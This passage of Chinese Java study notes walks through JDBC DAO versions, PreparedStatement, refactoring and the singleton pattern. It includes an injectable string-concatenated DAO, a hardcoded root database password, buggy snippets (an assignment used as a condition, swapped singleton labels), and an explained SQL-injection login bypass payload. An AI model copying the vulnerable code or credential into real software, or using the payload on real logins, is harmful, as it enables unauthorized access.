		//对于数据库的查询，返回的结果集ResultSet，在使用完结果集之前不能关闭该结果集，所以要专门用一个方法来专门关闭结果集。
		public void closeFunc()
		{
			try
			{
				if (rs != null)
				{
					rs.close();
					rs = null;
				}
				if (stat != null)
				{
					stat.close();
					stat = null;
				}
				if (conn != null)
				{
					conn.close();
					conn = null;
				}
			} catch (Exception e2)
			{
				e2.printStackTrace();
				System.out.println("关闭失误！");
			}
		}
	} 

c. `DAO`层测试代码：
>
	package com.trilever.daoTest;
	import java.sql.SQLException;
	import com.trilever.DAO.*;
	public class DAOTest
	{
		public static void main(String[] args) throws SQLException
		{
			new StudentDao().find();
			new StudentDao().add();
			new StudentDao().delete();
			new StudentDao().update();
		}
	}



2.0版本：  
a. `DAO`层接口代码：  
>
	/*
	 * 本类即是针对于student表的DAO层，主要提供功能就是数据的增删改查。
	 */
	package com.trilever.DAO;
	import java.sql.*;
	import com.trilever.DAOManager.*;
	import com.trilever.entity.*;
	public class StudentDao
	{
		public boolean add(Student stu) throws SQLException
		{
			String sql = "insert into student (stu_Id,stu_Name,stu_Age,stu_Ger,teachId,group_Id) values("
					+ stu.getStu_Id()
					+ ","
					+ "'"
					+ stu.getStu_Name()
					+ "'"
					+ ","
					+ stu.getStu_Age()
					+ ","
					+ stu.isStu_Ger()
					+ ","
					+ stu.getTeachId() + "," + stu.getGroup_Id() + ")";
			System.out.println(sql);
			DaoManager fdm = new DaoManager();
			int row = fdm.insertManager(sql);
			if (row != 0)
				return true;
			else
				return false;
		}
>	
		public boolean delete(int id) throws SQLException
		{
			String sql = "delete from student where stu_Id=" + id;
			System.out.println(sql);
			DaoManager fdm = new DaoManager();
			int row = fdm.deleteManager(sql);
			if (row != 0)
				return true;
			else
				return false;
		}
>	
		public boolean update(Student stu) throws SQLException
		{
			String sql = "update student set stu_Age =" + stu.getStu_Age()
					+ " where stu_Name='we'";
			System.out.println(sql);
			DaoManager fdm = new DaoManager();
			int row = fdm.updateManager(sql);
			if (row != 0)
				return true;
			else
				return false;
		}
>	
		public Student find(int id) throws SQLException
		{
			String sql = "select stu_Id,stu_Name,stu_Age,teachId, group_Id from student";
			DaoManager fdm = new DaoManager();
			ResultSet mk = fdm.findManager(sql);
			Student stu = new Student();
			while (mk.next())
			{
				stu.setStu_Id(mk.getInt("stu_Id"));
				stu.setStu_Name(mk.getString("stu_Name"));
				stu.setStu_Age(mk.getInt("stu_Age"));
				stu.setStu_Ger(true);
				stu.setTeachId(mk.getInt("teachId"));
				stu.setGroup_Id(mk.getInt("group_Id"));
			}
			// 对于查询而言，不能再使用结果集之前就关闭了结果集，所以要在DaoManager类中增加一个closeFunc()方法，以用于在使用了结果集ResultSet之后再关闭它
			fdm.closeFunc();
			return stu;
		}
	}


b. `DAO`层实体类代码：代表数据库中的任意一个实体，使代码更加面向对象。  
	
	package com.trilever.entity;
	public class Student
	{
		private int stu_Id;
		private String stu_Name;
		private int stu_Age;
		private boolean stu_Ger;
		private int teachId;
		private int group_Id;
		public Student()
		{
			super();
		}
		public int getStu_Id()
		{
			return stu_Id;
		}
		public void setStu_Id(int stu_Id)
		{
			this.stu_Id = stu_Id;
		}
		public Student(int stu_Id, String stu_Name, int stu_Age, boolean stu_Ger,
				int teachId, int group_Id)
		{
			super();
			this.stu_Id = stu_Id;
			this.stu_Name = stu_Name;
			this.stu_Age = stu_Age;
			this.stu_Ger = stu_Ger;
			this.teachId = teachId;
			this.group_Id = group_Id;
		}
		public Student(String stu_Name, int stu_Age, boolean stu_Ger, int teachId,
				int group_Id)
		{
			super();
			this.stu_Name = stu_Name;
			this.stu_Age = stu_Age;
			this.stu_Ger = stu_Ger;
			this.teachId = teachId;
			this.group_Id = group_Id;
		}
		@Override
		public String toString()
		{
			return "Student [stu_Name=" + stu_Name + ", stu_Age=" + stu_Age
					+ ", stu_Ger=" + stu_Ger + ", teachId=" + teachId
					+ ", group_Id=" + group_Id + "]";
		}
		@Override
		public boolean equals(Object arg0)
		{
			// TODO Auto-generated method stub
			return super.equals(arg0);
		}
		public String getStu_Name()
		{
			return stu_Name;
		}
		public void setStu_Name(String stu_Name)
		{
			this.stu_Name = stu_Name;
		}
		public int getStu_Age()
		{
			return stu_Age;
		}
		public void setStu_Age(int stu_Age)
		{
			this.stu_Age = stu_Age;
		}
		public int isStu_Ger()
		{
			if (stu_Ger = true)
				return 1;
			else
				return 0;
		}
		public void setStu_Ger(boolean stu_Ger)
		{
			this.stu_Ger = stu_Ger;
		}
		public int getTeachId()
		{
			return teachId;
		}
		public void setTeachId(int teachId)
		{
			this.teachId = teachId;
		}
		public int getGroup_Id()
		{
			return group_Id;
		}
		public void setGroup_Id(int group_Id)
		{
			this.group_Id = group_Id;
		}
	}

c. `DAO`层具体实现代码：
>
	/*
	 * 本类就是DAO层增、删、改、查各方法的具体实现
	 */
	package com.trilever.DAOManager;
	import java.sql.Connection;
	import java.sql.DriverManager;
	import java.sql.ResultSet;
	import java.sql.SQLException;
	import java.sql.Statement;
	public class DaoManager
	{
		private Connection conn = null;
		private Statement stat = null;
		private ResultSet rs = null;
		private String driver = "com.mysql.jdbc.Driver";
		private String url = "jdbc:mysql://localhost:3306/class";
		private String user = "root";
		private String password = "wt312041990";
		private int row = 0;
		public ResultSet findManager(String sql) throws SQLException
		{
			try
			{
				// 装载、注册类
				Class.forName(driver);
				// 修建Java应用程序与数据库之间连接的路径
				conn = DriverManager.getConnection(url, user, password);
				if (!conn.isClosed())
				{
					System.out.println("connects succees!");
				}
				// 创建用于数据运输的车
				stat = conn.createStatement();
				// 执行sql查询语句
				rs = stat.executeQuery(sql);
			} catch (ClassNotFoundException e)
			{
				e.printStackTrace();
				System.out.println("包没有找到");
			}
			return rs;
		}
>
		public int insertManager(String sql) throws SQLException
		{
			try
			{
				// 装载、注册类
				Class.forName(driver);
				// 修建Java应用程序与数据库之间连接的路径
				conn = DriverManager.getConnection(url, user, password);
				if (!conn.isClosed())
				{
					System.out.println("connects succees!");
				}
				// 创建用于数据运输的车
				stat = conn.createStatement();
				// 执行sql查询语句
				row = stat.executeUpdate(sql);
			} catch (ClassNotFoundException e)
			{
				e.printStackTrace();
				System.out.println("包没有找到");
			}
			finally
			{
				this.closeFunc();
			}
			return row;
		}
>	
		public int deleteManager(String sql) throws SQLException
		{
			try
			{
				// 装载、注册类
				Class.forName(driver);
				// 修建Java应用程序与数据库之间连接的路径
				conn = DriverManager.getConnection(url, user, password);
				if (!conn.isClosed())
				{
					System.out.println("connects succees!");
				}
				// 创建用于数据运输的车
				stat = conn.createStatement();
				// 执行sql查询语句
				row = stat.executeUpdate(sql);
			} catch (ClassNotFoundException e)
			{
				e.printStackTrace();
				System.out.println("包没有找到");
			}
			finally
			{
				this.closeFunc();
			}
			return row;
		}
>		
		public int updateManager(String sql) throws SQLException
		{
			try
			{
				// 装载、注册类
				Class.forName(driver);
				// 修建Java应用程序与数据库之间连接的路径
				conn = DriverManager.getConnection(url, user, password);
				if (!conn.isClosed())
				{
					System.out.println("connects succees!");
				}
				// 创建用于数据运输的车
				stat = conn.createStatement();
				// 执行sql查询语句
				row = stat.executeUpdate(sql);
			} catch (ClassNotFoundException e)
			{
				e.printStackTrace();
				System.out.println("包没有找到");
			}
			finally
			{
				this.closeFunc();
			}
			return row;
		}
		//对于数据库的查询，返回的结果集ResultSet，在使用完结果集之前不能关闭该结果集，所以要专门用一个方法来专门关闭结果集。
		public void closeFunc()
		{
			try
			{
				if (rs != null)
				{
					rs.close();
					rs = null;
				}
				if (stat != null)
				{
					stat.close();
					stat = null;
				}
				if (conn != null)
				{
					conn.close();
					conn = null;
				}
			} catch (Exception e2)
			{
				e2.printStackTrace();
				System.out.println("关闭失误！");
			}
		}
	}

d. `DAO`层测试代码：有一种软件编写方法是面向测试的编程，即先写出测试代码，然后再写主程序。  
>
	/*
	 * 本类就是DAO层的测试类
	 */
	package com.trilever.daoTest;
	import java.sql.SQLException;
	import com.trilever.DAO.*;
	import com.trilever.entity.*;
	public class DAOTest
	{
		public static void main(String[] args) throws SQLException
		{
			DAOTest dt = new DAOTest();
			dt.findTest();
		}
>	
		public void addTest() throws SQLException
		{
			Student stu = new Student(13, "wssgsdgs", 35, false, 23, 2);
			StudentDao stuD = new StudentDao();
			boolean result = stuD.add(stu);
			if (result == true)
			{
				System.out.println("增加数据成功");
			} else
				System.out.println("增加数据失败");
		}
>	
		public void deleteTest() throws SQLException
		{
			int id = 10;
			StudentDao stuD = new StudentDao();
			boolean result = stuD.delete(id);
			if (result == true)
			{
				System.out.println("刪除数据成功");
			} else
				System.out.println("刪除数据失败");
		}
>	
		public void updateTest() throws SQLException
		{
			Student stu = new Student(12, "wssgsdgs", 35, false, 23, 2);
			StudentDao stuD = new StudentDao();
			boolean result = stuD.update(stu);
			if (result == true)
			{
				System.out.println("修改数据成功");
			} else
				System.out.println("修改数据失败");
		}
>	
		public void findTest() throws SQLException
		{
			StudentDao stuD = new StudentDao();
			Student result = stuD.find(1);
			System.out.println(result);
		}
	}


`DAO`3.0版：使用了`PreparedStatement`预编译技术。还为`FindAll()`方法提供了从结果集向对象转换的接口。使此方法可以返回一个集合。  
a. `DAO`层接口代码： 
> 
	/*
	 * 本类即是针对于student表的DAO层，主要提供功能就是数据的增删改查。
	 */
	package com.trilever.DAO;
	import java.sql.*;
	import java.util.List;
	import com.trilever.DAOManager.*;
	import com.trilever.entity.*;
	public class StudentDao
	{
		public boolean add(Student stu) throws SQLException
		{
			String sql = "insert into student (stu_Id,stu_Name,stu_Age,stu_Ger,teachId,group_Id) values(?,?,?,?,?,?)";
			System.out.println(sql);
			Object[] obs = new Object[]
			{ stu.getStu_Id(), stu.getStu_Name(), stu.getStu_Age(),
					stu.isStu_Ger(), stu.getTeachId(), stu.getGroup_Id() };
			DaoManager fdm = new DaoManager();
			int row = fdm.insertManager(sql, obs);
			if (row != 0)
				return true;
			else
				return false;
		}
>	
		public boolean delete(int id) throws SQLException
		{
			String sql = "delete from student where stu_Id= ?";
			System.out.println(sql);
			DaoManager fdm = new DaoManager();
			int row = fdm.deleteManager(sql, id);
			if (row != 0)
				return true;
			else
				return false;
		}
>	
		public boolean update(Student stu) throws SQLException
		{
			String sql = "update student set stu_Age = ? where stu_Name=?";
			System.out.println(sql);
			Object[] obs = new Object[]
			{ stu.getStu_Age(), "trilever" };
			DaoManager fdm = new DaoManager();
			int row = fdm.updateManager(sql, obs);
			if (row != 0)
				return true;
			else
				return false;
		}
>	
		public Student find(int id) throws SQLException
		{
			String sql = "select stu_Id,stu_Name,stu_Age,stu_Ger,teachId, group_Id from student where stu_Id = ?";
			DaoManager fdm = new DaoManager();
			ResultSet mk = fdm.findManager(sql, id);
			Student stu = new Student();
			while (mk.next())
			{
				stu.setStu_Id(mk.getInt("stu_Id"));
				stu.setStu_Name(mk.getString("stu_Name"));
				stu.setStu_Age(mk.getInt("stu_Age"));
				stu.setStu_Ger(mk.getByte("stu_Ger"));
				stu.setTeachId(mk.getInt("teachId"));
				stu.setGroup_Id(mk.getInt("group_Id"));
			}
			// 对于查询而言，不能再使用结果集之前就关闭了结果集，所以要在DaoManager类中增加一个closeFunc()方法，以用于在使用了结果集ResultSet之后再关闭它
			fdm.closeFunc();
			return stu;
		}
>	
		public List<Student> findAll() throws SQLException
		{
			String sql = "select * from student";
			DaoManager fdm = new DaoManager();
			List<Student> mk = fdm.findAllManager(sql);
			// 对于查询而言，不能再使用结果集之前就关闭了结果集，所以要在DaoManager类中增加一个closeFunc()方法，以用于在使用了结果集ResultSet之后再关闭它
			fdm.closeFunc();
			return mk;
		}
	}

b. `DAO`层实体类代码：代表数据库中的任意一个实体，使代码更加面向对象。 
>
	package com.trilever.entity;
	public class Student
	{
		private int stu_Id;
		private String stu_Name;
		private int stu_Age;
		private byte stu_Ger;
		private int teachId;
		private int group_Id;
>	
		public Student()
		{
			super();
		}
>	
		/**
		 * @return the stu_Id
		 */
		public int getStu_Id()
		{
			return stu_Id;
		}
>	
		/**
		 * @param stu_Id
		 *            the stu_Id to set
		 */
		public void setStu_Id(int stu_Id)
		{
			this.stu_Id = stu_Id;
		}
>	
		public Student(int stu_Id, String stu_Name, int stu_Age, byte stu_Ger,
				int teachId, int group_Id)
		{
			super();
			this.stu_Id = stu_Id;
			this.stu_Name = stu_Name;
			this.stu_Age = stu_Age;
			this.stu_Ger = stu_Ger;
			this.teachId = teachId;
			this.group_Id = group_Id;
		}
>	
		public Student(String stu_Name, int stu_Age, byte stu_Ger, int teachId,
				int group_Id)
		{
			super();
			this.stu_Name = stu_Name;
			this.stu_Age = stu_Age;
			this.stu_Ger = stu_Ger;
			this.teachId = teachId;
			this.group_Id = group_Id;
		}
>	
		/*
		 * (non-Javadoc)
		 * 
		 * @see java.lang.Object#toString()
		 */
		@Override
		public String toString()
		{
			return "Student [stu_Id=" + stu_Id + ",stu_Name=" + stu_Name
					+ ", stu_Age=" + stu_Age + ", stu_Ger=" + stu_Ger
					+ ", teachId=" + teachId + ", group_Id=" + group_Id + "]";
		}
>	
		/*
		 * (non-Javadoc)
		 * 
		 * @see java.lang.Object#equals(java.lang.Object)
		 */
		@Override
		public boolean equals(Object arg0)
		{
			// TODO Auto-generated method stub
			return super.equals(arg0);
		}
>	
		/**
		 * @return the stu_Name
		 */
		public String getStu_Name()
		{
			return stu_Name;
		}
>	
		/**
		 * @param stu_Name
		 *            the stu_Name to set
		 */
		public void setStu_Name(String stu_Name)
		{
			this.stu_Name = stu_Name;
		}
>	
		/**
		 * @return the stu_Age
		 */
		public int getStu_Age()
		{
			return stu_Age;
		}
>	
		/**
		 * @param stu_Age
		 *            the stu_Age to set
		 */
		public void setStu_Age(int stu_Age)
		{
			this.stu_Age = stu_Age;
		}
>	
		/**
		 * @return the stu_Ger
		 */
		public byte isStu_Ger()
		{
			return this.stu_Ger;
		}
>	
		/**
		 * @param stu_Ger
		 *            the stu_Ger to set
		 */
		public void setStu_Ger(byte stu_Ger)
		{
			this.stu_Ger = stu_Ger;
		}
>	
		/**
		 * @return the teachId
		 */
		public int getTeachId()
		{
			return teachId;
		}
>	
		/**
		 * @param teachId
		 *            the teachId to set
		 */
		public void setTeachId(int teachId)
		{
			this.teachId = teachId;
		}
>	
		/**
		 * @return the group_Id
		 */
		public int getGroup_Id()
		{
			return group_Id;
		}
>	
		/**
		 * @param group_Id
		 *            the group_Id to set
		 */
		public void setGroup_Id(int group_Id)
		{
			this.group_Id = group_Id;
		}
	}
 
c. `DAO`层具体实现代码：
>	
	/*
	 * 本类就是DAO层增、删、改、查各方法的具体实现
	 */
	package com.trilever.DAOManager;
	import java.sql.Connection;
	import java.sql.DriverManager;
	import java.sql.PreparedStatement;
	import java.sql.ResultSet;
	import java.sql.SQLException;
	import java.sql.Statement;
	import java.util.LinkedList;
	import java.util.List;
	import com.trilever.entity.*;
	public class DaoManager
	{
		private Connection conn = null;
		private Statement stat = null;
		private ResultSet rs = null;
		private String driver = "com.mysql.jdbc.Driver";
		private String url = "jdbc:mysql://localhost:3306/class";
		private String user = "root";
		private String password = "wt312041990";
		private int row = 0;
		PreparedStatement past = null;
		public ResultSet findManager(String sql, int id) throws SQLException
		{
			try
			{
				// 装载、注册类
				Class.forName(driver);
				// 修建Java应用程序与数据库之间连接的路径
				conn = DriverManager.getConnection(url, user, password);
				if (!conn.isClosed())
				{
					System.out.println("connects succees!");
				}
				past = conn.prepareStatement(sql);
				past.setInt(1, id);
				// 执行sql查询语句
				rs = past.executeQuery();
			} catch (ClassNotFoundException e)
			{
				e.printStackTrace();
				System.out.println("包没有找到");
			}
			return rs;
		}
>	
		public List<Student> findAllManager(String sql) throws SQLException
		{
			List<Student> lstu = new LinkedList<>();
			try
			{
				// 装载、注册类
				Class.forName(driver);
				// 修建Java应用程序与数据库之间连接的路径
				conn = DriverManager.getConnection(url, user, password);
				if (!conn.isClosed())
				{
					System.out.println("connects succees!");
				}
				past = conn.prepareStatement(sql);
				// 执行sql查询语句
				rs = past.executeQuery();
				while (rs.next())
				{
					lstu.add(new ResultMappingEntity().MappingResultEntity(rs));
				}
			} catch (ClassNotFoundException e)
			{
				e.printStackTrace();
				System.out.println("包没有找到");
			}
			return lstu;
		}
>	
		public int insertManager(String sql, Object[] obs) throws SQLException
		{
			try
			{
				// 装载、注册类
				Class.forName(driver);
				// 修建Java应用程序与数据库之间连接的路径
				conn = DriverManager.getConnection(url, user, password);
				if (!conn.isClosed())
				{
					System.out.println("connects succees!");
				}
				past = conn.prepareStatement(sql);
				for (int i = 0; i < obs.length; i++)
				{
					past.setObject(i + 1, obs[i]);
				}
				// 执行sql查询语句
				row = past.executeUpdate();
			} catch (ClassNotFoundException e)
			{
				e.printStackTrace();
				System.out.println("包没有找到");
			} finally
			{
				this.closeFunc();
			}
			return row;
		}
>	
		public int deleteManager(String sql, int id) throws SQLException
		{
			try
			{
				// 装载、注册类
				Class.forName(driver);
				// 修建Java应用程序与数据库之间连接的路径
				conn = DriverManager.getConnection(url, user, password);
				if (!conn.isClosed())
				{
					System.out.println("connects succees!");
				}
				past = conn.prepareStatement(sql);
				past.setInt(1, id);
				// 执行sql查询语句
				row = past.executeUpdate();
			} catch (ClassNotFoundException e)
			{
				e.printStackTrace();
				System.out.println("包没有找到");
			} finally
			{
				this.closeFunc();
			}
			return row;
		}
>	
		public int updateManager(String sql, Object[] obs) throws SQLException
		{
			try
			{
				// 装载、注册类
				Class.forName(driver);
				// 修建Java应用程序与数据库之间连接的路径
				conn = DriverManager.getConnection(url, user, password);
				if (!conn.isClosed())
				{
					System.out.println("connects succees!");
				}
				past = conn.prepareStatement(sql);
				for (int i = 0; i < obs.length; i++)
				{
					past.setObject(i + 1, obs[i]);
				}
				// 执行sql查询语句
				row = past.executeUpdate();
			} catch (ClassNotFoundException e)
			{
				e.printStackTrace();
				System.out.println("包没有找到");
			} finally
			{
				this.closeFunc();
			}
			return row;
		}
>	
		// 对于数据库的查询，返回的结果集ResultSet，在使用完结果集之前不能关闭该结果集，所以要专门用一个方法来专门关闭结果集。
		public void closeFunc()
		{
			try
			{
				if (rs != null)
				{
					rs.close();
					rs = null;
				}
				if (stat != null)
				{
					stat.close();
					stat = null;
				}
				if (conn != null)
				{
					conn.close();
					conn = null;
				}
			} catch (Exception e2)
			{
				e2.printStackTrace();
				System.out.println("关闭失误！");
			}
		}
	}
d. 转换类，用于将`ResultSet`中的数据转换成`Student`对象。
>
	package com.trilever.DAOManager;
	import java.sql.ResultSet;
	import java.sql.SQLException;
	import com.trilever.entity.Student;
	interface ResultMappingtoEntity
	{
		public Object MappingResultEntity(ResultSet rs) throws SQLException;
	}
>
	public class ResultMappingEntity implements ResultMappingtoEntity
	{
		/*
		 * (non-Javadoc)
		 * 
		 * @see
		 * com.trilever.DAOManager.ResultMappingEntity#MappingResultEntity(java.
		 * sql.ResultSet)
		 */
		@Override
		public Student MappingResultEntity(ResultSet rs) throws SQLException
		{
			Student stu = new Student(rs.getInt("stu_Id"),
					rs.getString("stu_Name"), rs.getInt("stu_Age"),
					rs.getByte("stu_Ger"), rs.getInt("teachId"),
					rs.getInt("group_Id"));
			return stu;
		}
	}

e. `DAO`层测试代码：有一种软件编写方法是面向测试的编程，即先写出测试代码，然后再写主程序。 
>
	/*
	 * 本类就是DAO层的测试类
	 */
	package com.trilever.daoTest;
	import java.sql.SQLException;
	import java.util.List;
	import com.trilever.DAO.*;
	import com.trilever.entity.*;
	public class DAOTest
	{
		public static void main(String[] args) throws SQLException
		{
			DAOTest dt = new DAOTest();
			dt.findAllTest();
		}
>	
		public void addTest() throws SQLException
		{
			Student stu = new Student(31, "wssgsdgs", 35, (byte) 1, 23, 2);
			StudentDao stuD = new StudentDao();
			boolean result = stuD.add(stu);
			if (result == true)
			{
				System.out.println("增加数据成功");
			} else
				System.out.println("增加数据失败");
		}
>	
		public void deleteTest() throws SQLException
		{
			int id = 31;
			StudentDao stuD = new StudentDao();
			boolean result = stuD.delete(id);
			if (result == true)
			{
				System.out.println("刪除数据成功");
			} else
				System.out.println("刪除数据失败");
		}
>	
		public void updateTest() throws SQLException
		{
			Student stu = new Student(12, "wssgsdgs", 35, (byte) 1, 23, 2);
			StudentDao stuD = new StudentDao();
			boolean result = stuD.update(stu);
			if (result == true)
			{
				System.out.println("修改数据成功");
			} else
				System.out.println("修改数据失败");
		}
>	
		public void findTest() throws SQLException
		{
			StudentDao stuD = new StudentDao();
			Student result = stuD.find(1);
			System.out.println(result);
		}
>	
		public void findAllTest() throws SQLException
		{
			StudentDao stuD = new StudentDao();
			List<Student> ls = stuD.findAll();
			for (Student student : ls)
			{
				System.out.println(student);
			}
		}
	}

#Java中的PraparedStatement
-----
`PraparedStatement`这个接口继承了`Statement`接口。  
当在`Java`中依次执行多条`SQL`语句时，如果这些`SQL`语句的结构都相同只是语句的参数不同，那么在使用`Statement`进行`SQL`语句的执行就会将`SQL`语句发送给数据库服务器，然后数据库依次编译每一条`SQL`语句并执行，这样就会导致多次编译的问题，实际上这些语句的结构都是相同的，用不着多次编译。  
此时就可以使用`PraparedStatement`来执行`SQL`语句了。这样就可以使结构相同参数不同的多条语句只编译一次，提升效率。实际上就是采用预编译机制。  
使用`PraparedStatement`还有一个功效就是：防止`SQL`注入。传统的`SQL`注入会导致报错。  

传统的`SQL`注入：  
怎样登陆网站后台输入界面？  
`Answer`：`URL`后面添加`background`或者`sysadmin`。
那么`SQL`注入的目的？
无需密码即进入网站后台。

任何登陆页面(无论是网站还是程序应用app)，任何用户输入账号、密码之后都是将账号密码拼成一个`SQL`语句，然后提交给后台数据库进行处理，如果输入争取就会返回想要的结果，也就是登陆成功进入账户。  
那么，`SQL`注入的原理就是，保证无论输入什么账号和密码，都能保证我们的`SQL`语句能获得通过。
如：  
加入某应用`app`的登陆界面的`SQL`语句时：
>
	select * from users where name = aname,password = pwd;  

其中的`aname`是我们在登陆界面输入的账号字符串，`pwd`是我们在界面输入的密码字符串。  
那么，当我们在密码输入框中输入：  
>
	sss or 'a'='a'  
那么就会使得登陆界面向数据库提交的`SQL`语句是：
>
	select * from users where name = aname,password = sss or 'a'='a';

这条语句，即使我们填入的`password`是错误的，后面的删选条件依旧是正确的，也就是说依旧成立。这就是`SQL`注入的原理，让我们即使输入错误的密码，但是提交给数据库的`SQL`语句依旧是正确的。  
这样，无论是什么样的登陆，只要是通过`SQL`语句与后台数据库进行交互的，都可以使用`SQL`注入方式登陆。 
我们首先要知道这个登陆界面的`SQL`语句时怎样拼的之后才可以写出正确的`SQL`注入语句。

使用`PraparedStatement`有两种方式：  
使用示例1：
>	
	package com.trilever.SQL;
	import java.sql.Connection;
	import java.sql.DriverManager;
	import java.sql.PreparedStatement;
	import java.sql.ResultSet;
	import java.sql.SQLException;
	import java.sql.Statement;
	public class PreparedStatementTest
	{
		public static void main(String[] args) throws SQLException
		{
			Connection conn = null;
			Statement stat = null;
			ResultSet rs = null;
			String driver = "com.mysql.jdbc.Driver";
			String url = "jdbc:mysql://localhost:3306/class";
			String user = "root";
			String password = "wt312041990";
			int row = 0;
			PreparedStatement pst = null;
			try
			{
				// 装载、注册类
				Class.forName(driver);
				// 修建Java应用程序与数据库之间连接的路径
				conn = DriverManager.getConnection(url, user, password);
				if (!conn.isClosed())
				{
					System.out.println("connects succees!");
				}
				// 创建用于数据运输的车
				// 执行sql查询语句
				String sql = "insert into student (stu_Id,stu_Name,stu_Age,stu_Ger,teachId,group_Id) values(?,?,?,?,?,?)";
				//创建一个PreparedStatement对象，以后可以向这个对象中传递参数。
				pst = conn.prepareStatement(sql);
>	
				// 可以直接无数次向这个语句中传递参数，这样可以让数据库只编译一次这个语句，但是可以执行n次SQL语句。
				//如果这里不知道是什么类型，可以使用setObject()方法。
				pst.setInt(1, 20);
				pst.setString(2, "trilever");
				pst.setInt(3, 18);
				pst.setByte(4, (byte) 1);
				pst.setInt(5, 22);
				pst.setInt(6, 1);
				row = pst.executeUpdate();
				System.out.println(row);
>	
				// 可以直接无数次向这个语句中传递参数，这样可以让数据库只编译一次这个语句，但是可以执行n次SQL语句。
				pst.setInt(1, 21);
				pst.setString(2, "trileverwt");
				pst.setInt(3, 18);
				pst.setByte(4, (byte) 1);
				pst.setInt(5, 22);
				pst.setInt(6, 1);
				row = pst.executeUpdate();
				System.out.println(row);
			} catch (ClassNotFoundException e)
			{
				e.printStackTrace();
				System.out.println("包没有找到");
			} finally
			{
				conn.close();
				pst.close();
			}
		}
	}

示例2：使用`addBatch()`
>
	package com.trilever.SQL;
	import java.sql.Connection;
	import java.sql.DriverManager;
	import java.sql.PreparedStatement;
	import java.sql.ResultSet;
	import java.sql.SQLException;
	import java.sql.Statement;
	public class BatchPreparedStatementTest
	{
		public static void main(String[] args) throws SQLException
		{
			Connection conn = null;
			Statement stat = null;
			ResultSet rs = null;
			String driver = "com.mysql.jdbc.Driver";
			String url = "jdbc:mysql://localhost:3306/class";
			String user = "root";
			String password = "wt312041990";
			int row = 0;
			PreparedStatement pst = null;
			try
			{
				// 装载、注册类
				Class.forName(driver);
				// 修建Java应用程序与数据库之间连接的路径
				conn = DriverManager.getConnection(url, user, password);
				if (!conn.isClosed())
				{
					System.out.println("connects succees!");
				}
				// 创建用于数据运输的车
				// 执行sql查询语句
				String sql = "insert into student (stu_Id,stu_Name,stu_Age,stu_Ger,teachId,group_Id) values(?,?,?,?,?,?)";
				//创建一个PreparedStatement对象，以后可以向这个对象中传递参数。
				pst = conn.prepareStatement(sql);
>	
				// 可以直接无数次向这个语句中传递参数，这样可以让数据库只编译一次这个语句，但是可以执行n次SQL语句。
				pst.setInt(1, 23);
				pst.setString(2, "trilever");
				pst.setInt(3, 18);
				pst.setByte(4, (byte) 1);
				pst.setInt(5, 22);
				pst.setInt(6, 1);
				//将参数集加入到批处理中
				pst.addBatch();
>				
				pst.setInt(1, 24);
				pst.setString(2, "trileverwt");
				pst.setInt(3, 18);
				pst.setByte(4, (byte) 1);
				pst.setInt(5, 22);
				pst.setInt(6, 1);
				//将参数集加入到批处理中,用这种批处理的方法，可以让处理大量的同结构的SQL语句更加快捷。
				pst.addBatch();
				int[] rows = pst.executeBatch();
				for(int n:rows)
				{
					System.out.println(n);
				}
			} catch (ClassNotFoundException e)
			{
				e.printStackTrace();
				System.out.println("包没有找到");
			} finally
			{
				conn.close();
				pst.close();
			}
		}
	}

#软件开发
------------
程序员开发的都是应用程序，分为两种：`B/S`与`C/S`。  
`C/S`有两种：基于图形界面的与基于命令行的。服务器端需要一个数据库服务器。  每一个客户端都是有一份代码。  
`B/S`：浏览器连接`Web`服务器，`Web`服务器后面连接的是数据库服务器(也就是说需要两个服务器)。代码只在`Web`服务器中才有一份。  
`Java`的强项是开发`B/S`。  
`JSP/Servlet`是`Java`开发`B/S`的技术。  
`Hibernate/Spring/JPA`既可以开发`C/S`也可以开发`B/S`。  
`JSP、Servlet、Struts1、Structs2、JSF、Ajax、Flex、Jquery`是`Java`开发`B/S`的技术、

#Java中的重构
---------
重构的作用：提高已经写好的软件的代码可重用性(某些模块可以被其他软件再次使用)，可扩展性(可以方便地添加新功能)，可维护性(代码脉络清晰)。  
例如：从`DAO1.0`到`DAO2.0`，抽取出`DAOManager`模块，就是一个重构过程，因为使得`DAOManager`模块可以被其他软件复用。  
面向对象编码要求：  
1. 面向对象的思维方式，也就是对于软件中所需要的实体，要专门写一个类，例如：对于一个简单的登陆输入账号密码验证，应该写出一个用户类，然后将这个用户类中的`Field`设为账号与密码，而不能直接在业务逻辑中使用账号与密码，应该使用的是这个用户类对象，这样才是面向对象的思维。  
2. 要将业务逻辑从`main()方`法中分离开来，这样才能保证业务逻辑(如、账号密码的判断)被以后的软件复用。  
3. 要考虑用户的所有使用错误，例如，输入错误，没有输入，输入空格等行为。我们的代码中必须对此予以判断。

总之，实体对象要抽取出来做一个类，业务逻辑部分也要抽取出来做一个类。
在重构过程中我们要使用的一些方法与思想，成为设计模式。

#Java中的设计模式：
----
什么叫设计模式？
`Answer`:我们平常遇到的各种问题，往往可以用相同的思想但是细节不同的方法予以解决，这就是所谓的设计模式。实际上就是编写软件、处理问题时的高级算法。

设计模式按照功能的不同分为3类：
1. 创建模式：创建对象，类在实例化时使用的模式。  
2. 结构模式：类(对象)怎样组合在一起组成较大的结构。  
3. 行为模式：关注类与对象之间的联系，各自作用。  

##单态模式：
用于一个类只产生一个类对象的模式，例如，在`C/S`架构中，一个客户端只能与服务器产生一个`Connection`对象，这里就应该使用单态模式。
某些时候，我们只想为某个类创建一个对象。这时候就需要使用单例类。
  
要实现单例：  
1. 不能暴露构造器。否则可以自由创建多个实例。所以，需要人工写一个无参构造器，且设为`private`形式，这样可以防止`JDK`自己创建默认构造器。且构造器只能在类内使用。  
2. 设置一个静态`field`用于缓存在3中的方法所创建的实例，且这个`field`可用于检测保证仅创建了一个实例。  
3. 暴露一个方法，用该方法来返回一个实例。设为`public`。由于调用这个方法的时候没有实例，所以需要使用类来调用该方法。所以这个方法必须是`static`的。同时，该方法内部必须在创建一个实例之前先检测*2*中的`field`，保证只存在一个实例，这样才能保证这是一个单例类。  
4. 使用*3*中创建的方法来创建一个对象。  
单态模式有两种：懒汉式单态类与饿汉式单态类  

饿汉式单态类示例如下：只有在调用了创建对象的方法是才会有类对象。
>
	public class singleTon
	{
		public int a;
		private singleTon() //创建private构造器，防止JDK自己创建构造器
		{
		}
>
		private static singleTon h=null; //创建static field，用于缓存创建的单例对象，同时检测是否单例。
>	
		public static singleTon f() //创建static方法，以创建单例对象，返回该对象引用。
		{
			if(h==null)
			{
				h=new singleTon();
			}
			return h;
	    }
		public static void main(String[] args)
		{
			System.out.println(singleTon.f().a); //使用static单例对象创建方法来创建单例。
		}
>		
		{
			a=10;
		}
	}

懒汉式单态类实例如下：只要加载了这个类就会有单态类对象。  
>
